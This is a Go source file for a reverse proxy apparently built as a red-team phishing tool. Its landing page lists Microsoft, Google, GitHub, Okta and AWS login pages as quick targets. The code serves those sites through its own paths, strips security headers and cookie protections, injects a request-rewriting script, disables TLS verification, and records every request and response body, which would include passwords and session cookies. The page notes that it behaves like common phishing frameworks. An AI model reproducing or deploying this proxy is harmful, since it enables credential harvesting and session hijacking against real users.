// Package revproxy implements the multi-tenant reverse proxy.
//
// Mirrors backend/reverse_proxy.py: /_r/{host}/{path} → https://{host}/{path}
// with URL + cookie + header rewriting, and pushes every exchange to the
// Python flow buffer via flowclient.
package revproxy

import (
	"crypto/tls"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/bitm-proxy/go/internal/flowclient"
)

const LandingHTML = `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>BITM Reverse Proxy</title>
<style>
body{font-family:system-ui,-apple-system,sans-serif;background:#0a0a1a;color:#e2e8f0;margin:0;padding:40px;max-width:720px}
h1{color:#7dd3fc;margin-bottom:8px}
.sub{color:#94a3b8;font-size:14px;margin-bottom:24px}
form{display:flex;gap:8px;margin-bottom:16px}
input{flex:1;padding:10px 12px;background:#1a1a2e;border:1px solid #444;color:#e2e8f0;border-radius:4px;font-size:14px}
input:focus{outline:none;border-color:#3b82f6}
button{padding:10px 20px;background:#1e3a5f;border:1px solid #3b82f6;color:#93c5fd;border-radius:4px;cursor:pointer;font-size:14px;font-weight:600}
button:hover{background:#264a72}
.section{margin-top:28px}
.section h2{color:#94a3b8;font-size:13px;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
.examples{display:flex;flex-wrap:wrap;gap:6px}
.examples span{background:#1a1a2e;border:1px solid #333;padding:4px 10px;border-radius:3px;color:#fbbf24;cursor:pointer;font-size:13px;font-family:'SF Mono',monospace}
.examples span:hover{border-color:#3b82f6}
.note{background:#1a1a14;border-left:3px solid #b45309;padding:10px 14px;margin-top:24px;font-size:13px;color:#fcd34d;line-height:1.6}
.active{margin-top:16px;background:#0d0d20;border:1px solid #222;border-radius:4px;padding:12px}
.active a{color:#7dd3fc;text-decoration:none;font-size:13px;display:block;padding:3px 0}
.active a:hover{text-decoration:underline}
.badge{display:inline-block;padding:2px 8px;background:#064e3b;color:#4ade80;border:1px solid #22c55e55;border-radius:3px;font-size:12px;font-family:monospace;margin-left:8px}
</style></head>
<body>
<h1>BITM Reverse Proxy <span class="badge">Go</span></h1>
<div class="sub">Multi-tenant transparent proxy. Every req/resp pair is captured to the Flow Trace tab on the debug dashboard (:8092) under session <code>revproxy_&lt;hostname&gt;</code>.</div>

<form onsubmit="event.preventDefault();go()">
  <input id="target" type="text" placeholder="https://login.microsoftonline.com" autofocus>
  <button type="submit">Proxy</button>
</form>

<div class="section">
  <h2>Quick targets</h2>
  <div class="examples">
    <span onclick="fill(this)">https://login.microsoftonline.com</span>
    <span onclick="fill(this)">https://accounts.google.com</span>
    <span onclick="fill(this)">https://github.com/login</span>
    <span onclick="fill(this)">https://okta.com</span>
    <span onclick="fill(this)">https://signin.aws.amazon.com</span>
  </div>
</div>

<div class="section" id="active-wrap" style="display:none">
  <h2>Sessions captured so far (this instance)</h2>
  <div class="active" id="active-list"></div>
</div>

<div class="note">
  Authorized pentest / red-team use only. This proxy behaves identically to
  common phishing frameworks — do not use against production systems without
  written authorization.
</div>

<script>
function fill(el){document.getElementById('target').value=el.textContent;go()}
function go(){
  const u=document.getElementById('target').value.trim();if(!u)return;
  let p;try{p=new URL(u.startsWith('http')?u:'https://'+u)}catch(e){alert('Invalid URL');return}
  window.location.href='/_r/'+p.hostname+(p.pathname||'/')+(p.search||'');
}
fetch('/_sessions').then(r=>r.json()).then(d=>{
  const list=d.sessions||[];
  if(!list.length)return;
  document.getElementById('active-wrap').style.display='';
  document.getElementById('active-list').innerHTML=list.map(h=>` + "`" + `<a href="/_r/${h}/">${h}</a>` + "`" + `).join('');
}).catch(()=>{});
</script>
</body>
</html>
`

var jsShimTemplate = `<base href="/_r/%s/">
<script>(function(){
  const P = "/_r/%s";
  const origFetch = window.fetch;
  window.fetch = function(input, init){
    try {
      if (typeof input === 'string' && input.startsWith('/') && !input.startsWith(P)) {
        input = P + input;
      } else if (input && typeof input === 'object' && input.url && input.url.startsWith('/') && !input.url.startsWith(P)) {
        input = new Request(P + input.url, input);
      }
    } catch(e){}
    return origFetch.call(this, input, init);
  };
  const origXhrOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url){
    try {
      if (typeof url === 'string' && url.startsWith('/') && !url.startsWith(P)) {
        arguments[1] = P + url;
      }
    } catch(e){}
    return origXhrOpen.apply(this, arguments);
  };
})();</script>
`

var (
	stripHeaders = map[string]bool{
		"content-security-policy":            true,
		"content-security-policy-report-only": true,
		"x-frame-options":                    true,
		"strict-transport-security":          true,
		"permissions-policy":                 true,
		"feature-policy":                     true,
		"cross-origin-opener-policy":         true,
		"cross-origin-embedder-policy":       true,
		"cross-origin-resource-policy":       true,
		"content-length":                     true,
		"content-encoding":                   true,
		"transfer-encoding":                  true,
	}
	hopByHop = map[string]bool{
		"connection":          true,
		"keep-alive":          true,
		"proxy-authenticate":  true,
		"proxy-authorization": true,
		"te":                  true,
		"trailers":            true,
		"transfer-encoding":   true,
		"upgrade":             true,
	}
	absURLRE = regexp.MustCompile(`(https?:)?//([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})(/[^"'\s<>)]*)?`)
)

type Server struct {
	flow          *flowclient.Client
	sessionHostsM sync.RWMutex
	sessionHosts  map[string]bool
	upstream      *http.Client
	log           *slog.Logger
}

func New(flow *flowclient.Client) *Server {
	return &Server{
		flow:         flow,
		sessionHosts: make(map[string]bool),
		upstream: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				MaxIdleConns:    50,
				IdleConnTimeout: 60 * time.Second,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse // we handle redirects ourselves via Location rewrite
			},
		},
		log: slog.Default().With("component", "revproxy"),
	}
}

func (s *Server) Handler() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/", s.handleRoot)
	mux.HandleFunc("/_sessions", s.handleSessions)
	mux.HandleFunc("/_pick", s.handlePick)
	mux.HandleFunc("/_r/", s.handleProxy)
	return mux
}

func (s *Server) handleRoot(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(LandingHTML))
}

func (s *Server) handleSessions(w http.ResponseWriter, r *http.Request) {
	s.sessionHostsM.RLock()
	defer s.sessionHostsM.RUnlock()
	hosts := make([]string, 0, len(s.sessionHosts))
	for h := range s.sessionHosts {
		hosts = append(hosts, h)
	}
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"sessions":[`)
	for i, h := range hosts {
		if i > 0 {
			fmt.Fprint(w, ",")
		}
		fmt.Fprintf(w, `%q`, h)
	}
	fmt.Fprint(w, `]}`)
}

func (s *Server) handlePick(w http.ResponseWriter, r *http.Request) {
	raw := r.URL.Query().Get("url")
	if raw == "" {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(LandingHTML))
		return
	}
	if !strings.Contains(raw, "://") {
		raw = "https://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil || u.Hostname() == "" {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(LandingHTML))
		return
	}
	target := "/_r/" + u.Hostname() + u.Path
	if u.Path == "" {
		target = "/_r/" + u.Hostname() + "/"
	}
	if u.RawQuery != "" {
		target += "?" + u.RawQuery
	}
	http.Redirect(w, r, target, http.StatusFound)
}

// handleProxy handles /_r/{host}/{path*}
func (s *Server) handleProxy(w http.ResponseWriter, r *http.Request) {
	// Parse /_r/{host}/{path}
	parts := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/_r/"), "/", 2)
	if len(parts) < 1 || parts[0] == "" {
		http.Error(w, "missing target host", http.StatusBadRequest)
		return
	}
	targetHost := parts[0]
	targetPath := "/"
	if len(parts) == 2 {
		targetPath = "/" + parts[1]
	}

	sid := "revproxy_" + targetHost
	s.sessionHostsM.Lock()
	s.sessionHosts[targetHost] = true
	s.sessionHostsM.Unlock()

	targetURL := "https://" + targetHost + targetPath
	if r.URL.RawQuery != "" {
		targetURL += "?" + r.URL.RawQuery
	}

	s.flow.Log("info", "reverse_proxy",
		fmt.Sprintf("PROXY %s %s", r.Method, targetURL), sid)

	// Build upstream request headers
	upstreamReqHeaders := http.Header{}
	for k, vs := range r.Header {
		lk := strings.ToLower(k)
		if hopByHop[lk] || lk == "host" || lk == "content-length" {
			continue
		}
		for _, v := range vs {
			// Rewrite Referer so upstream sees its own origin
			if lk == "referer" && strings.Contains(v, "/_r/") {
				if idx := strings.Index(v, "/_r/"); idx >= 0 {
					tail := v[idx+4:]
					if slash := strings.Index(tail, "/"); slash > 0 {
						v = "https://" + tail[:slash] + tail[slash:]
					} else {
						v = "https://" + tail + "/"
					}
				}
			}
			// Rewrite Origin to upstream's own
			if lk == "origin" {
				v = "https://" + targetHost
			}
			upstreamReqHeaders.Add(k, v)
		}
	}
	upstreamReqHeaders.Set("Host", targetHost)
	upstreamReqHeaders.Set("Accept-Encoding", "identity")

	// Read request body
	var reqBodyBytes []byte
	if r.Body != nil {
		reqBodyBytes, _ = io.ReadAll(r.Body)
	}

	reqID := fmt.Sprintf("rp_%d_%p", time.Now().UnixMicro(), r)
	var reqBodyStr *string
	if len(reqBodyBytes) > 0 {
		ss := string(reqBodyBytes)
		reqBodyStr = &ss
	}

	// Push initial flow entry
	s.flow.AppendFlow(flowclient.Entry{
		SessionID:      sid,
		ReqID:          reqID,
		TsReq:          float64(time.Now().UnixNano()) / 1e9,
		Method:         r.Method,
		URL:            targetURL,
		ResourceType:   "reverse_proxy",
		RequestHeaders: headerToMap(upstreamReqHeaders),
		RequestBody:    reqBodyStr,
	})

	// Make upstream request
	upstreamReq, err := http.NewRequest(r.Method, targetURL, strings.NewReader(string(reqBodyBytes)))
	if err != nil {
		http.Error(w, "bad upstream URL: "+err.Error(), http.StatusBadRequest)
		return
	}
	upstreamReq.Header = upstreamReqHeaders

	resp, err := s.upstream.Do(upstreamReq)
	if err != nil {
		s.flow.Log("warn", "reverse_proxy",
			fmt.Sprintf("Upstream error: %v for %s", err, targetURL), sid)
		status := 502
		ts := float64(time.Now().UnixNano()) / 1e9
		s.flow.UpdateFlow(flowclient.Update{
			SessionID: sid,
			ReqID:     reqID,
			TsResp:    &ts,
			Status:    &status,
		})
		http.Error(w, "reverse proxy upstream error: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	// Read response body fully
	respBodyBytes, _ := io.ReadAll(resp.Body)

	// Rewrite body based on content type
	contentType := resp.Header.Get("Content-Type")
	respBodyBytes = rewriteBody(respBodyBytes, contentType, targetHost)

	// Build response headers
	for k, vs := range resp.Header {
		lk := strings.ToLower(k)
		if stripHeaders[lk] || hopByHop[lk] {
			continue
		}
		if lk == "location" {
			for _, v := range vs {
				w.Header().Add(k, rewriteLocation(v, targetHost))
			}
			continue
		}
		if lk == "set-cookie" {
			for _, v := range vs {
				w.Header().Add(k, rewriteSetCookie(v, targetHost))
			}
			continue
		}
		for _, v := range vs {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)
	w.Write(respBodyBytes)

	// Push response into flow
	const maxBody = 64 * 1024
	bodyStr := string(respBodyBytes)
	truncated := false
	if len(bodyStr) > maxBody {
		bodyStr = bodyStr[:maxBody]
		truncated = true
	}
	ts := float64(time.Now().UnixNano()) / 1e9
	status := resp.StatusCode
	s.flow.UpdateFlow(flowclient.Update{
		SessionID:             sid,
		ReqID:                 reqID,
		TsResp:                &ts,
		Status:                &status,
		ResponseHeaders:       headerToMap(resp.Header),
		ResponseBody:          &bodyStr,
		ResponseBodyTruncated: truncated,
	})
}

func rewriteBody(body []byte, contentType, targetHost string) []byte {
	if len(body) == 0 {
		return body
	}
	ct := strings.ToLower(contentType)
	isHTML := strings.Contains(ct, "html")
	isCSS := strings.Contains(ct, "css")
	isJS := strings.Contains(ct, "javascript") || strings.Contains(ct, "ecmascript")
	isJSON := strings.Contains(ct, "json")
	isText := strings.HasPrefix(ct, "text/")
	if !(isHTML || isCSS || isJS || isJSON || isText) {
		return body
	}
	text := string(body)
	text = absURLRE.ReplaceAllStringFunc(text, func(m string) string {
		subs := absURLRE.FindStringSubmatch(m)
		if len(subs) < 3 {
			return m
		}
		host := subs[2]
		path := ""
		if len(subs) >= 4 {
			path = subs[3]
		}
		return "/_r/" + host + path
	})
	if isHTML {
		shim := fmt.Sprintf(jsShimTemplate, targetHost, targetHost)
		if strings.Contains(text, "<head>") {
			text = strings.Replace(text, "<head>", "<head>"+shim, 1)
		} else if strings.Contains(text, "<html>") {
			text = strings.Replace(text, "<html>", "<html>"+shim, 1)
		} else {
			text = shim + text
		}
	}
	return []byte(text)
}

func rewriteLocation(location, targetHost string) string {
	if location == "" {
		return location
	}
	if strings.HasPrefix(location, "http://") || strings.HasPrefix(location, "https://") {
		u, err := url.Parse(location)
		if err != nil {
			return location
		}
		out := "/_r/" + u.Host + u.Path
		if u.RawQuery != "" {
			out += "?" + u.RawQuery
		}
		return out
	}
	if strings.HasPrefix(location, "//") {
		u, err := url.Parse("http:" + location)
		if err != nil {
			return location
		}
		out := "/_r/" + u.Host + u.Path
		if u.RawQuery != "" {
			out += "?" + u.RawQuery
		}
		return out
	}
	if strings.HasPrefix(location, "/") {
		return "/_r/" + targetHost + location
	}
	return location
}

func rewriteSetCookie(cookie, targetHost string) string {
	parts := strings.Split(cookie, ";")
	out := make([]string, 0, len(parts))
	hasPath := false
	for _, raw := range parts {
		p := strings.TrimSpace(raw)
		if p == "" {
			continue
		}
		low := strings.ToLower(p)
		if low == "secure" {
			continue
		}
		if strings.HasPrefix(low, "domain=") {
			continue
		}
		if strings.HasPrefix(low, "samesite=") {
			continue
		}
		if strings.HasPrefix(low, "path=") {
			rawPath := strings.TrimPrefix(p, "Path=")
			rawPath = strings.TrimPrefix(rawPath, "path=")
			if !strings.HasPrefix(rawPath, "/") {
				rawPath = "/" + rawPath
			}
			out = append(out, "Path=/_r/"+targetHost+rawPath)
			hasPath = true
			continue
		}
		out = append(out, p)
	}
	if !hasPath {
		out = append(out, "Path=/_r/"+targetHost+"/")
	}
	return strings.Join(out, "; ")
}

func headerToMap(h http.Header) map[string]string {
	m := make(map[string]string, len(h))
	for k, vs := range h {
		if len(vs) > 0 {
			m[k] = vs[0]
		}
	}
	return m
}
